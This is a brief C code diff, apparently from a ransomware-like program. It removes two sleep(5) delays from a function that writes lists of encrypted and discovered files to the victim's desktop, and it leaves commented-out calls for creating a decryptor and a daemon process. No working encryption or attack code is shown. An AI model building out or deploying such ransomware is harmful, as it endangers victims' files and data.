@@ -77,9 +77,7 @@ void find_files(List **files, char* start_path){
  * @param files -> type = List
  */
 void create_files_desktop(List *encrypted, List *files, char * desktop){
-    sleep(5);
     save_into_file_encrypted_list(encrypted, desktop);
-    sleep(5);
     save_into_file_files_list(files, desktop);
     //create_decryptor(desktop);
     //create_daemon_process();
